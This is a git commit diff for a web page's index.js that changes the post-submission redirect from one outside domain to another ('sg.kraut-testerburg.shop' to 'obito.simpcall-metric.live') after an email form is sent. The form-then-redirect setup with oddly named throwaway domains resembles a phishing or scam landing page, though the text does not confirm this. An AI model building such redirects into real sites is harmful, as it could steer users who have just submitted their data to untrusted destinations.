68ad2eebc2502dafbe8f82eb84bf28d2482bc124
husknet <127146284+husknet@users.noreply.github.com>
2024-08-16 10:12:45 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.kraut-testerburg.shop';
+        window.location.href = 'https://obito.simpcall-metric.live/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
